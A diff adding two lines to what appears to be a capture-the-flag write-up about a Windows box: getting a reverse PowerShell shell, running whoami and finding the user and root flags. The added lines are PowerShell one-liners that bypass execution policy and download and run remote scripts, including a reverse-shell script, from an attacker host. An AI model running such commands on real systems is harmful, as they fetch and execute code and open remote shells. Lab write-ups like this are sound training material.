@@ -61,3 +61,7 @@ And boom we have a reverse powershell connection
 From here just find the user flag, which was just a txt file located in C:\
 
 Then ran 'whoami' and found out we were already system user so we looked in Administrator/Desktop and found the root flag
+
+powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.45.189:4444/winPEAS.ps1'));
+
+powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString('http://192.168.45.189:4444/Invoke-PowerShellTcp.ps1'));winPEAS"
